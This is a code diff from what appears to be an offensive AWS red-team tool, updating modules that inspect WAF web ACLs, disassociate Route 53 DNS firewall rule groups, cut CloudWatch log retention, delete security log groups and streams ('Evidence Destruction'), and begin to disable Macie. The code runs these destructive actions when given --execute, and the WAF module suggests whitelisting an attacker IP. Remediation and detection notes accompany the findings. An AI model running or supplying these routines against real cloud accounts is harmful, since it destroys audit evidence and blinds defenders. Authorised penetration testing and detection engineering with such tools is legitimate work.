@@ -669,68 +669,112 @@ export async function wafBypass(args: string[], timeout: number): Promise<HookRe
   const action = argVal(args, "--action") || "status"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] WAF Bypass\n"]
+  const output: string[] = ["[*] WAF Bypass — Web ACL Analysis\n"]
   const findings: Finding[] = []
 
-  const webAcls = await aws(
-    ["wafv2", "list-web-acls", "--scope", "REGIONAL", "--query", "WebACLs[].[Name,Id,ARN]"],
-    profile,
-    region,
-    timeout,
-  )
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["wafv2:ListWebACLs", "wafv2:GetWebACL", "wafv2:UpdateWebACL", "wafv2:DeleteWebACL", "wafv2:ListIPSets", "wafv2:ListRegexPatternSets"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: UpdateWebACL, DeleteWebACL, UpdateIPSet`)
+  output.push(`[*] Detection: WAF logging shows rule changes, Config rule for WAF association`)
+
+  const webAcls = await aws(["wafv2", "list-web-acls", "--scope", "REGIONAL", "--query", "WebACLs[].[Name,Id,ARN]"], profile, region, timeout)
   if (webAcls.exitCode === 0) {
     const wl = tryJson(webAcls.stdout) || []
-    output.push(`[+] Regional Web ACLs: ${wl.length}`)
-    for (const w of wl) {
-      output.push(`    ${w[0]} (${w[1]})`)
-      const desc = await aws(
-        ["wafv2", "get-web-acl", "--scope", "REGIONAL", "--name", w[0], "--id", w[1]],
-        profile,
-        region,
-        timeout,
-      )
+    output.push(`\n[+] Regional Web ACLs: ${wl.length}`)
+    for (const w of wl as string[][]) {
+      output.push(`\n  ${w[0]} (${w[1]})`)
+      const desc = await aws(["wafv2", "get-web-acl", "--scope", "REGIONAL", "--name", w[0], "--id", w[1]], profile, region, timeout)
       if (desc.exitCode === 0) {
-        const acl = tryJson(desc.stdout)?.WebACL
-        const rules = acl?.Rules || []
-        output.push(
-          `      Rules: ${rules.length}, Default: ${acl?.DefaultAction ? Object.keys(acl.DefaultAction)[0] : "unknown"}`,
-        )
-        for (const r of rules)
-          output.push(`        ${r.Name} — ${r.Priority} — ${Object.keys(r.Action || {})[0] || "count"}`)
+        const data = tryJson(desc.stdout)
+        const acl = data?.WebACL || {}
+        const rules = acl.Rules || []
+        const defaultAction = acl.DefaultAction ? Object.keys(acl.DefaultAction)[0] : "unknown"
+        output.push(`    Rules: ${rules.length}, Default: ${defaultAction}`)
+        if (defaultAction === "Allow") output.push(`    [!] Default=Allow — removing all rules exposes unfiltered traffic`)
+
+        let blockRules = 0
+        let countRules = 0
+        let managedRules = 0
+        for (const r of rules as Record<string, unknown>[]) {
+          const rAction = Object.keys(r.Action || {})[0] || "count"
+          if (rAction === "Block") blockRules++
+          if (rAction === "Count") countRules++
+          if (r.Statement && (r.Statement as Record<string, unknown>).ManagedRuleGroupStatement) managedRules++
+          output.push(`    ${r.Name} — pri:${r.Priority} — ${rAction}${r.OverrideAction ? " (override:" + Object.keys(r.OverrideAction)[0] + ")" : ""}`)
+        }
+        output.push(`    Summary: ${blockRules} block, ${countRules} count-only, ${managedRules} managed rule groups`)
+
+        const resources = await aws(["wafv2", "list-resources-for-web-acl", "--web-acl-arn", w[2], "--resource-type", "APPLICATION_LOAD_BALANCER"], profile, region, timeout)
+        if (resources.exitCode === 0) {
+          const rl2 = tryJson(resources.stdout)?.ResourceArns || []
+          if (rl2.length > 0) {
+            output.push(`    Protected ALBs: ${rl2.length}`)
+            for (const r of rl2 as string[]) output.push(`      ${r.split("/").pop()}`)
+          }
+        }
+
+        const apiGw = await aws(["wafv2", "list-resources-for-web-acl", "--web-acl-arn", w[2], "--resource-type", "API_GATEWAY"], profile, region, timeout)
+        if (apiGw.exitCode === 0) {
+          const al = tryJson(apiGw.stdout)?.ResourceArns || []
+          if (al.length > 0) output.push(`    Protected API Gateways: ${al.length}`)
+        }
+
+        if (allowed.has("wafv2:UpdateWebACL")) {
+          findings.push({ checkId: "AWS-EVASION-WAF-001", provider: "aws", severity: "critical", status: "READY", resource: w[2], title: `WAF modification viable: ${w[0]}`, details: `UpdateWebACL allowed — can remove ${blockRules} blocking rules or switch default to Allow. Lock-token from GetWebACL required.`, remediation: "Restrict wafv2:UpdateWebACL, enable WAF logging, monitor for rule changes" })
+        }
+        if (allowed.has("wafv2:DeleteWebACL")) {
+          findings.push({ checkId: "AWS-EVASION-WAF-002", provider: "aws", severity: "critical", status: "READY", resource: w[2], title: `WAF deletion viable: ${w[0]}`, details: "DeleteWebACL allowed — can remove WAF entirely (must disassociate resources first)", remediation: "Restrict wafv2:DeleteWebACL via SCP" })
+        }
       }
     }
   }
 
-  const cfWebAcls = await aws(
-    ["wafv2", "list-web-acls", "--scope", "CLOUDFRONT", "--region", "us-east-1", "--query", "WebACLs[].[Name,Id]"],
-    profile,
-    undefined,
-    timeout,
-  )
+  const cfWebAcls = await aws(["wafv2", "list-web-acls", "--scope", "CLOUDFRONT", "--region", "us-east-1", "--query", "WebACLs[].[Name,Id,ARN]"], profile, undefined, timeout)
   if (cfWebAcls.exitCode === 0) {
     const cl = tryJson(cfWebAcls.stdout) || []
     if (cl.length > 0) {
       output.push(`\n[+] CloudFront Web ACLs: ${cl.length}`)
-      for (const c of cl) output.push(`    ${c[0]} (${c[1]})`)
+      for (const c of cl as string[][]) output.push(`  ${c[0]} (${c[1]})`)
     }
   }
 
-  const ipSets = await aws(
-    ["wafv2", "list-ip-sets", "--scope", "REGIONAL", "--query", "IPSets[].[Name,Id]"],
-    profile,
-    region,
-    timeout,
-  )
+  const ipSets = await aws(["wafv2", "list-ip-sets", "--scope", "REGIONAL", "--query", "IPSets[].[Name,Id,ARN]"], profile, region, timeout)
   if (ipSets.exitCode === 0) {
     const il = tryJson(ipSets.stdout) || []
     if (il.length > 0) {
       output.push(`\n[+] IP Sets: ${il.length}`)
-      for (const i of il) output.push(`    ${i[0]} (${i[1]})`)
+      for (const i of il as string[][]) output.push(`  ${i[0]} (${i[1]})`)
+      if (allowed.has("wafv2:UpdateWebACL")) output.push(`  [*] Tip: modify IP set to whitelist attacker IP rather than removing rules`)
     }
   }
 
-  if (action === "status")
-    output.push("\n[*] Manual WAF modification requires web-acl lock-token. Use AWS console or specific API calls.")
+  const regexSets = await aws(["wafv2", "list-regex-pattern-sets", "--scope", "REGIONAL", "--query", "RegexPatternSets[].[Name,Id]"], profile, region, timeout)
+  if (regexSets.exitCode === 0) {
+    const rl2 = tryJson(regexSets.stdout) || []
+    if (rl2.length > 0) {
+      output.push(`\n[+] Regex Pattern Sets: ${rl2.length}`)
+      for (const r of rl2 as string[][]) output.push(`  ${r[0]} (${r[1]})`)
+    }
+  }
+
+  if (action === "status") {
+    const viable: string[] = []
+    if (allowed.has("wafv2:UpdateWebACL")) viable.push("update_acl (remove rules/switch default)")
+    if (allowed.has("wafv2:DeleteWebACL")) viable.push("delete_acl")
+    output.push(`\n[*] Viable vectors: ${viable.length > 0 ? viable.join(", ") : "NONE — WAF is read-only"}`)
+    output.push(`[*] WAF modification requires lock-token from GetWebACL — use AWS console or targeted API calls`)
+  }
 
   return { output: output.join("\n"), findings }
 }
@@ -739,87 +783,97 @@ export async function dnsFirewallDisable(args: string[], timeout: number): Promi
   const action = argVal(args, "--action") || "status"
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
-  const output: string[] = ["[*] Route 53 Resolver DNS Firewall\n"]
+  const execute = hasFlag(args, "--execute")
+  const output: string[] = ["[*] Route 53 Resolver DNS Firewall — DNS Filtering Evasion\n"]
   const findings: Finding[] = []
 
-  const groups = await aws(
-    ["route53resolver", "list-firewall-rule-groups", "--query", "FirewallRuleGroups[].[Id,Name,ShareStatus,OwnerId]"],
-    profile,
-    region,
-    timeout,
-  )
-  if (groups.exitCode !== 0) return { output: `[-] Cannot list DNS firewall groups: ${groups.stderr.trim()}`, findings }
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["route53resolver:ListFirewallRuleGroups", "route53resolver:DisassociateFirewallRuleGroup", "route53resolver:DeleteFirewallRuleGroup"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: DisassociateFirewallRuleGroup, DeleteFirewallRuleGroup`)
+  output.push(`[*] Detection: Config rule for DNS firewall association, CloudWatch metric on blocked queries dropping`)
+
+  const groups = await aws(["route53resolver", "list-firewall-rule-groups", "--query", "FirewallRuleGroups[].[Id,Name,ShareStatus,OwnerId]"], profile, region, timeout)
+  if (groups.exitCode !== 0) return { output: output.join("\n") + `\n[-] Cannot list DNS firewall groups: ${groups.stderr.trim()}`, findings }
 
   const gl = tryJson(groups.stdout) || []
-  output.push(`[+] DNS Firewall Rule Groups: ${gl.length}`)
+  output.push(`\n[+] DNS Firewall Rule Groups: ${gl.length}`)
 
-  for (const g of gl) {
-    output.push(`\n    ${g[1]} (${g[0]}) — ${g[2]} — owner: ${g[3]}`)
+  for (const g of gl as string[][]) {
+    const isShared = g[2] === "SHARED_WITH_ME"
+    output.push(`\n  ${g[1]} (${g[0]}) — ${g[2]} — owner: ${g[3]}`)
+    if (isShared) output.push(`    [!] Shared by org — deletion blocked, only disassociation possible`)
 
-    const rules = await aws(
-      [
-        "route53resolver",
-        "list-firewall-rules",
-        "--firewall-rule-group-id",
-        g[0],
-        "--query",
-        "FirewallRules[].[Name,Action,Priority,FirewallDomainListId]",
-      ],
-      profile,
-      region,
-      timeout,
-    )
+    const rules = await aws(["route53resolver", "list-firewall-rules", "--firewall-rule-group-id", g[0], "--query", "FirewallRules[].[Name,Action,Priority,FirewallDomainListId]"], profile, region, timeout)
     if (rules.exitCode === 0) {
       const rl = tryJson(rules.stdout) || []
-      output.push(`      Rules: ${rl.length}`)
-      for (const r of rl) output.push(`        ${r[0]} — ${r[1]} — priority: ${r[2]}`)
+      let blockRules = 0
+      let alertRules = 0
+      output.push(`    Rules: ${rl.length}`)
+      for (const r of rl as string[][]) {
+        output.push(`      ${r[0]} — ${r[1]} — pri:${r[2]}`)
+        if (r[1] === "BLOCK") blockRules++
+        if (r[1] === "ALERT") alertRules++
+      }
+      output.push(`    Summary: ${blockRules} block, ${alertRules} alert`)
     }
 
-    const assocs = await aws(
-      [
-        "route53resolver",
-        "list-firewall-rule-group-associations",
-        "--query",
-        "FirewallRuleGroupAssociations[].[Id,Name,VpcId,FirewallRuleGroupId,Status]",
-      ],
-      profile,
-      region,
-      timeout,
-    )
+    const assocs = await aws(["route53resolver", "list-firewall-rule-group-associations", "--query", "FirewallRuleGroupAssociations[].[Id,Name,VpcId,FirewallRuleGroupId,Status,Priority,MutationProtection]"], profile, region, timeout)
     if (assocs.exitCode === 0) {
-      const al = (tryJson(assocs.stdout) || []).filter((a: string[]) => a[3] === g[0])
+      const al = (tryJson(assocs.stdout) || []).filter((a: string[]) => a[3] === g[0]) as string[][]
       if (al.length > 0) {
-        output.push(`      VPC Associations: ${al.length}`)
-        for (const a of al) output.push(`        ${a[1]} — VPC: ${a[2]} — ${a[4]}`)
+        output.push(`    VPC Associations: ${al.length}`)
+        for (const a of al) {
+          output.push(`      ${a[1]} — VPC: ${a[2]} — ${a[4]} — pri:${a[5]}${a[6] === "ENABLED" ? " [MUTATION-PROTECTED]" : ""}`)
+        }
 
         if (action === "disassociate") {
+          if (!allowed.has("route53resolver:DisassociateFirewallRuleGroup")) {
+            output.push(`    [-] route53resolver:DisassociateFirewallRuleGroup DENIED — blocked`)
+            findings.push({ checkId: "AWS-EVASION-DNS-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `dns:firewall:${g[0]}`, title: "DNS firewall disassociation blocked", details: "Cannot remove DNS firewall from VPCs", remediation: "N/A" })
+            continue
+          }
           for (const a of al) {
-            const r = await aws(
-              ["route53resolver", "disassociate-firewall-rule-group", "--firewall-rule-group-association-id", a[0]],
-              profile,
-              region,
-              timeout,
-            )
-            if (r.exitCode === 0) {
-              output.push(`        [+] Disassociated from VPC: ${a[2]}`)
-              findings.push({
-                checkId: "AWS-EVASION-010",
-                provider: "aws",
-                severity: "critical",
-                status: "DISABLED",
-                resource: `dns:firewall:${g[0]}`,
-                title: `DNS Firewall disassociated from VPC: ${a[2]}`,
-                details: `Rule group ${g[1]} removed from VPC ${a[2]}`,
-                remediation: "Re-associate firewall rule group with VPC",
-              })
+            if (a[6] === "ENABLED") {
+              output.push(`      [!] ${a[0]} is mutation-protected — disassociation may fail`)
             }
+            if (!execute) {
+              output.push(`      [+] DRY RUN — would disassociate from VPC: ${a[2]}`)
+              continue
+            }
+            const r = await aws(["route53resolver", "disassociate-firewall-rule-group", "--firewall-rule-group-association-id", a[0]], profile, region, timeout)
+            if (r.exitCode === 0) {
+              output.push(`      [+] Disassociated from VPC: ${a[2]}`)
+              findings.push({ checkId: "AWS-EVASION-010", provider: "aws", severity: "critical", status: "DISABLED", resource: `dns:firewall:${g[0]}`, title: `DNS Firewall disassociated from VPC: ${a[2]}`, details: `Rule group ${g[1]} removed from VPC ${a[2]} — DNS exfil/C2 no longer blocked. CloudTrail event: DisassociateFirewallRuleGroup`, remediation: "Re-associate firewall rule group with VPC" })
+            } else {
+              output.push(`      [-] Failed: ${r.stderr.trim()}`)
+            }
+          }
+          if (!execute) {
+            findings.push({ checkId: "AWS-EVASION-010", provider: "aws", severity: "critical", status: "READY", resource: `dns:firewall:${g[0]}`, title: `DNS firewall disassociation viable: ${al.length} VPC(s)`, details: "DisassociateFirewallRuleGroup allowed — DNS filtering can be removed", remediation: "Restrict via SCP, enable mutation protection" })
           }
         }
       }
     }
   }
 
-  if (action === "status") output.push("\n[*] Actions: --action disassociate (remove from VPCs)")
+  if (action === "status") {
+    const viable: string[] = []
+    if (allowed.has("route53resolver:DisassociateFirewallRuleGroup")) viable.push("disassociate")
+    if (allowed.has("route53resolver:DeleteFirewallRuleGroup")) viable.push("delete (owned groups only)")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE"}`)
+    output.push(`[*] Use --action disassociate [--execute]`)
+  }
 
   return { output: output.join("\n"), findings }
 }
@@ -830,149 +884,133 @@ export async function cloudwatchTamper(args: string[], timeout: number): Promise
   const action = argVal(args, "--action") || "status"
   const groupName = argVal(args, "--log-group")
   const retentionDays = argVal(args, "--retention") || "1"
+  const execute = hasFlag(args, "--execute")
   const findings: Finding[] = []
-  const output: string[] = ["[*] CloudWatch Logs Tampering\n"]
+  const output: string[] = ["[*] CloudWatch Logs Tampering — Evidence Destruction\n"]
 
-  const groups = await aws(
-    ["logs", "describe-log-groups", "--query", "logGroups[].[logGroupName,storedBytes,retentionInDays,kmsKeyId]"],
-    profile,
-    region,
-    timeout,
-  )
-  if (groups.exitCode !== 0)
-    return { output: output.join("\n") + "\n[-] Access denied: logs:DescribeLogGroups", findings }
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["logs:DescribeLogGroups", "logs:DeleteLogGroup", "logs:PutRetentionPolicy", "logs:DeleteLogStream", "logs:DescribeLogStreams"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: DeleteLogGroup, PutRetentionPolicy, DeleteLogStream`)
+  output.push(`[*] Detection: CloudWatch alarm on log group metric filters, Config rule for log retention`)
+
+  const groups = await aws(["logs", "describe-log-groups", "--query", "logGroups[].[logGroupName,storedBytes,retentionInDays,kmsKeyId]"], profile, region, timeout)
+  if (groups.exitCode !== 0) return { output: output.join("\n") + "\n[-] Access denied: logs:DescribeLogGroups", findings }
 
   const gl = tryJson(groups.stdout) || []
-  output.push(`[+] Log groups: ${gl.length}`)
+  output.push(`\n[+] Log groups: ${gl.length}`)
+
+  let totalSizeMB = 0
+  for (const g of gl as (string | number | null)[][]) totalSizeMB += Math.round((Number(g[1]) || 0) / 1024 / 1024)
+  output.push(`  Total stored: ${totalSizeMB}MB`)
 
   const securityGroups = gl.filter((g: (string | number | null)[]) => {
     const name = String(g[0]).toLowerCase()
-    return (
-      name.includes("cloudtrail") ||
-      name.includes("guardduty") ||
-      name.includes("config") ||
-      name.includes("vpc-flow") ||
-      name.includes("waf") ||
-      name.includes("security")
-    )
+    return name.includes("cloudtrail") || name.includes("guardduty") || name.includes("config") || name.includes("vpc-flow") || name.includes("waf") || name.includes("security") || name.includes("audit") || name.includes("detective")
   })
 
+  const noRetention = (gl as (string | number | null)[][]).filter(g => g[2] === null)
+  if (noRetention.length > 0) output.push(`  [!] ${noRetention.length} log group(s) have no retention (never expire)`)
+
   if (securityGroups.length) {
-    output.push(`\n[!] Security-relevant log groups:`)
-    for (const g of securityGroups) {
+    output.push(`\n[!] Security-relevant log groups (${securityGroups.length}):`)
+    for (const g of securityGroups as (string | number | null)[][]) {
       const sizeMB = Math.round((Number(g[1]) || 0) / 1024 / 1024)
-      output.push(`  ${g[0]}  Size: ${sizeMB}MB  Retention: ${g[2] || "never expires"}`)
+      output.push(`  ${g[0]}  Size: ${sizeMB}MB  Retention: ${g[2] || "never expires"}${g[3] ? "  KMS: encrypted" : ""}`)
     }
   }
 
   if (action === "status") {
-    output.push(
-      "\n[*] Actions: --action delete (delete group), --action reduce_retention (set 1-day retention), --action delete_streams (delete log streams)",
-    )
+    const viable: string[] = []
+    if (allowed.has("logs:DeleteLogGroup")) viable.push("delete")
+    if (allowed.has("logs:PutRetentionPolicy")) viable.push("reduce_retention")
+    if (allowed.has("logs:DeleteLogStream")) viable.push("delete_streams")
+    output.push(`\n[*] Viable actions: ${viable.length > 0 ? viable.join(", ") : "NONE — all blocked"}`)
+    output.push(`[*] Use --action delete|reduce_retention|delete_streams [--log-group <name>] [--retention <days>] [--execute]`)
     return { output: output.join("\n"), findings }
   }
 
   if (action === "reduce_retention") {
-    const targets = groupName ? gl.filter((g: string[]) => g[0] === groupName) : securityGroups
+    if (!allowed.has("logs:PutRetentionPolicy")) {
+      output.push(`\n[-] logs:PutRetentionPolicy DENIED — retention reduction blocked`)
+      findings.push({ checkId: "AWS-EVASION-CW-001", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudWatch retention reduction blocked", details: "Cannot modify log retention", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    const targets = groupName ? (gl as (string | number | null)[][]).filter(g => g[0] === groupName) : securityGroups as (string | number | null)[][]
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would set retention to ${retentionDays}d on ${targets.length} log group(s):`)
+      for (const g of targets) output.push(`  ${g[0]} (current: ${g[2] || "never"})`)
+      findings.push({ checkId: "AWS-EVASION-011", provider: "aws", severity: "critical", status: "READY", resource: `cloudwatch:retention:${targets.length}`, title: `Log retention reduction viable: ${targets.length} groups`, details: `PutRetentionPolicy allowed — can set all security groups to ${retentionDays}d`, remediation: "Restrict logs:PutRetentionPolicy, enforce minimum retention via SCP" })
+      return { output: output.join("\n"), findings }
+    }
     for (const g of targets) {
-      const r = await aws(
-        ["logs", "put-retention-policy", "--log-group-name", g[0], "--retention-in-days", retentionDays],
-        profile,
-        region,
-        timeout,
-      )
+      const r = await aws(["logs", "put-retention-policy", "--log-group-name", g[0] as string, "--retention-in-days", retentionDays], profile, region, timeout)
       if (r.exitCode === 0) {
-        output.push(`[+] Retention set to ${retentionDays} day(s): ${g[0]}`)
-        findings.push({
-          checkId: "AWS-EVASION-011",
-          provider: "aws",
-          severity: "critical",
-          status: "MODIFIED",
-          resource: `cloudwatch:loggroup:${g[0]}`,
-          title: `Log retention reduced to ${retentionDays}d: ${g[0]}`,
-          details: `Previous retention: ${g[2] || "never expires"} → ${retentionDays} day(s). Old logs will auto-delete`,
-          remediation: `Restore retention: aws logs put-retention-policy --log-group-name '${g[0]}' --retention-in-days ${g[2] || 365}`,
-        })
+        output.push(`[+] Retention set to ${retentionDays}d: ${g[0]}`)
+        findings.push({ checkId: "AWS-EVASION-011", provider: "aws", severity: "critical", status: "MODIFIED", resource: `cloudwatch:loggroup:${g[0]}`, title: `Log retention reduced to ${retentionDays}d: ${g[0]}`, details: `Previous: ${g[2] || "never"} → ${retentionDays}d. CloudTrail event: PutRetentionPolicy`, remediation: `Restore: aws logs put-retention-policy --log-group-name '${g[0]}' --retention-in-days ${g[2] || 365}` })
       }
     }
   }
 
   if (action === "delete") {
-    const target = groupName || securityGroups[0]?.[0]
-    if (!target)
-      return { output: output.join("\n") + "\n[-] --log-group required or no security groups found", findings }
-
-    const r = await aws(
-      ["logs", "delete-log-group", "--log-group-name", typeof target === "string" ? target : target[0]],
-      profile,
-      region,
-      timeout,
-    )
-    const name = typeof target === "string" ? target : target[0]
+    if (!allowed.has("logs:DeleteLogGroup")) {
+      output.push(`\n[-] logs:DeleteLogGroup DENIED — deletion blocked`)
+      findings.push({ checkId: "AWS-EVASION-CW-002", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudWatch log group deletion blocked", details: "Cannot delete log groups", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    const target = groupName || (securityGroups[0] as (string | number | null)[] | undefined)?.[0]
+    if (!target) return { output: output.join("\n") + "\n[-] --log-group required or no security groups found", findings }
+    const name = typeof target === "string" ? target : String(target)
+    if (!execute) {
+      output.push(`\n[+] DRY RUN — would delete log group: ${name}`)
+      findings.push({ checkId: "AWS-EVASION-012", provider: "aws", severity: "critical", status: "READY", resource: `cloudwatch:loggroup:${name}`, title: `Log group deletion viable: ${name}`, details: "DeleteLogGroup allowed — all log data will be permanently destroyed", remediation: "Restrict logs:DeleteLogGroup via SCP" })
+      return { output: output.join("\n"), findings }
+    }
+    const r = await aws(["logs", "delete-log-group", "--log-group-name", name], profile, region, timeout)
     if (r.exitCode === 0) {
       output.push(`[+] Log group deleted: ${name}`)
-      findings.push({
-        checkId: "AWS-EVASION-012",
-        provider: "aws",
-        severity: "critical",
-        status: "DELETED",
-        resource: `cloudwatch:loggroup:${name}`,
-        title: `CloudWatch log group deleted: ${name}`,
-        details: "All log data permanently destroyed",
-        remediation: "Log group and data cannot be recovered — recreate and reconfigure log delivery",
-      })
+      findings.push({ checkId: "AWS-EVASION-012", provider: "aws", severity: "critical", status: "DELETED", resource: `cloudwatch:loggroup:${name}`, title: `CloudWatch log group deleted: ${name}`, details: "All log data permanently destroyed. CloudTrail event: DeleteLogGroup", remediation: "Log group and data cannot be recovered — recreate and reconfigure log delivery" })
     } else {
       output.push(`[-] Delete failed: ${r.stderr.trim()}`)
     }
   }
 
   if (action === "delete_streams") {
-    const target = groupName || securityGroups[0]?.[0]
+    if (!allowed.has("logs:DeleteLogStream")) {
+      output.push(`\n[-] logs:DeleteLogStream DENIED — stream deletion blocked`)
+      findings.push({ checkId: "AWS-EVASION-CW-003", provider: "aws", severity: "info", status: "BLOCKED", resource: `iam://${callerArn}`, title: "CloudWatch stream deletion blocked", details: "Cannot delete log streams", remediation: "N/A" })
+      return { output: output.join("\n"), findings }
+    }
+    const target = groupName || (securityGroups[0] as (string | number | null)[] | undefined)?.[0]
     if (!target) return { output: output.join("\n") + "\n[-] --log-group required", findings }
-    const name = typeof target === "string" ? target : target[0]
+    const name = typeof target === "string" ? target : String(target)
 
-    const streams = await aws(
-      [
-        "logs",
-        "describe-log-streams",
-        "--log-group-name",
-        name,
-        "--order-by",
-        "LastEventTime",
-        "--descending",
-        "--limit",
-        "50",
-        "--query",
-        "logStreams[].logStreamName",
-      ],
-      profile,
-      region,
-      timeout,
-    )
+    const streams = await aws(["logs", "describe-log-streams", "--log-group-name", name, "--order-by", "LastEventTime", "--descending", "--limit", "50", "--query", "logStreams[].logStreamName"], profile, region, timeout)
     if (streams.exitCode === 0) {
       const stl = tryJson(streams.stdout) || []
+      if (!execute) {
+        output.push(`\n[+] DRY RUN — would delete ${stl.length} stream(s) from: ${name}`)
+        findings.push({ checkId: "AWS-EVASION-013", provider: "aws", severity: "critical", status: "READY", resource: `cloudwatch:streams:${name}`, title: `Stream deletion viable: ${stl.length} streams in ${name}`, details: "DeleteLogStream allowed — evidence can be selectively removed while group persists", remediation: "Restrict logs:DeleteLogStream" })
+        return { output: output.join("\n"), findings }
+      }
       let deleted = 0
       for (const st of stl) {
-        const d = await aws(
-          ["logs", "delete-log-stream", "--log-group-name", name, "--log-stream-name", st],
-          profile,
-          region,
-          timeout,
-        )
+        const d = await aws(["logs", "delete-log-stream", "--log-group-name", name, "--log-stream-name", st], profile, region, timeout)
         if (d.exitCode === 0) deleted++
       }
       output.push(`[+] Deleted ${deleted}/${stl.length} log streams from ${name}`)
       if (deleted > 0) {
-        findings.push({
-          checkId: "AWS-EVASION-013",
-          provider: "aws",
-          severity: "critical",
-          status: "DELETED",
-          resource: `cloudwatch:streams:${name}`,
-          title: `${deleted} log streams deleted from ${name}`,
-          details: "Log streams and their data permanently destroyed — group still exists but evidence removed",
-          remediation: "Log data cannot be recovered — investigate timeline and restore from backups",
-        })
+        findings.push({ checkId: "AWS-EVASION-013", provider: "aws", severity: "critical", status: "DELETED", resource: `cloudwatch:streams:${name}`, title: `${deleted} log streams deleted from ${name}`, details: "Log streams permanently destroyed — group exists but evidence removed. CloudTrail event: DeleteLogStream", remediation: "Log data cannot be recovered — investigate timeline and restore from backups" })
       }
     }
   }
@@ -984,74 +1022,100 @@ export async function macieDisable(args: string[], timeout: number): Promise<Hoo
   const profile = argVal(args, "--profile")
   const region = argVal(args, "--region")
   const action = argVal(args, "--action") || "status"
+  const execute = hasFlag(args, "--execute")
   const findings: Finding[] = []
-  const output: string[] = ["[*] Amazon Macie — Sensitive Data Discovery\n"]
+  const output: string[] = ["[*] Amazon Macie — Sensitive Data Discovery Evasion\n"]
+
+  const id = await aws(["sts", "get-caller-identity"], profile, region, timeout)
+  if (id.exitCode !== 0) return { output: `[-] No valid credentials: ${id.stderr.trim()}`, findings }
+  const callerArn = (tryJson(id.stdout)?.Arn || "") as string
+  output.push(`[+] Identity: ${callerArn}`)
+
+  const simActions = ["macie2:GetMacieSession", "macie2:UpdateMacieSession", "macie2:DisableMacie"]
+  const sim = await aws(["iam", "simulate-principal-policy", "--policy-source-arn", callerArn, "--action-names", ...simActions], profile, region, timeout)
+  const results = tryJson(sim.stdout)?.EvaluationResults || []
+  const allowed = new Set((results as Record<string, string>[]).filter(r => r.EvalDecision === "allowed").map(r => r.EvalActionName))
+
+  output.push(`\n[*] Pre-flight permission check:`)
+  for (const a of simActions) output.push(`  ${allowed.has(a) ? "[+] ALLOWED" : "[-] DENIED"}: ${a}`)
+
+  output.push(`\n[*] CloudTrail events: UpdateMacieSession, DisableMacie`)
+  output.push(`[*] Detection: Macie finding count drops, org admin sees member status change`)
 
   const session = await aws(["macie2", "get-macie-session"], profile, region, timeout)
   if (session.exitCode !== 0) {
-    output.push("[-] Macie not enabled or access denied")
+    output.push("\n[-] Macie not enabled or access denied")
     return { output: output.join("\n"), findings }
   }
 
-  const s = tryJson(session.stdout)
-  output.push(`[+] Macie status: ${s?.status}`)
-  output.push(`    Created: ${s?.createdAt}`)
-  output.push(`    Service role: ${s?.serviceRole}`)
-  output.push(`    Finding publishing frequency: ${s?.findingPublishingFrequency}`)
+  const s = tryJson(session.stdout) || {}
+  output.push(`\n[+] Macie status: ${s.status}`)
+  output.push(`  Created: ${s.createdAt}`)
+  output.push(`  Service role: ${s.serviceRole}`)
+  output.push(`  Finding publishing: ${s.findingPublishingFrequency}`)
 
-  const buckets = await aws(["macie2", "describe-buckets", "--query", "buckets | length(@)"], profile, region, timeout)
-  if (buckets.exitCode === 0) {
-    output.push(`    Monitored buckets: ${tryJson(buckets.stdout) || 0}`)
+  const admin = await aws(["macie2", "get-administrator-account"], profile, region, timeout)
+  if (admin.exitCode === 0) {
+    const adm = tryJson(admin.stdout)?.administrator
+    if (adm?.accountId) output.push(`  [!] Org admin: ${adm.accountId} (${adm.relationshipStatus}) — disable may be blocked`)
   }
 
-  const jobs = await aws(
